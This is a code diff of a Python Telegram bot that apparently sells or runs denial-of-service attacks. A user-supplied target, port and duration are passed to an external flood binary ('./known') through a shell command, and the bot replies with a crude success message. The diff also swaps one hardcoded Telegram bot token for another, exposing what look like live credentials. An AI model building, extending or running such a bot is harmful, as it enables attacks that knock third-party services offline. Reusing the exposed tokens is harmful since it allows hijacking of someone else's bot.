@@ -6,7 +6,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7938979700:AAG6MF8RGGXg_zmU3ovP3O-vxCjlRzWl-ms')
+bot = telebot.TeleBot('8157379227:AAH5wdKp7Jo7seIs9xdIqQXTigCMkLVH1dU')
 
 # Admin user IDs
 admin_id = {"7702886430"}
@@ -302,8 +302,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./2111 {target} {port} {time} 800"
-                    full_command = f"./ranbal {target} {port} {time} 900"
+                    full_command = f"./known {target} {port} {time} 9 900"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
